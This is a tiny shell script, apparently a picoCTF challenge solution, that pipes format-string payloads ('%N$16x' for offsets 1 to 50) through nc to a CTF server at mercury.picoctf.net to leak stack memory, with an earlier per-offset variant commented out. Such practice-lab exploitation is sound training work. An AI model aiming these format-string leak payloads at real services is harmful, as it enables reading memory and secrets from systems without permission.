#/bin/sh

# for i in {1..50};
# do
#     (echo 1; echo "%${i}\$08x") | nc mercury.picoctf.net 33411
# done | less


(echo 1; for i in {1..50}; do echo -n "%${i}\$16x"; done; echo) | nc mercury.picoctf.net 33411
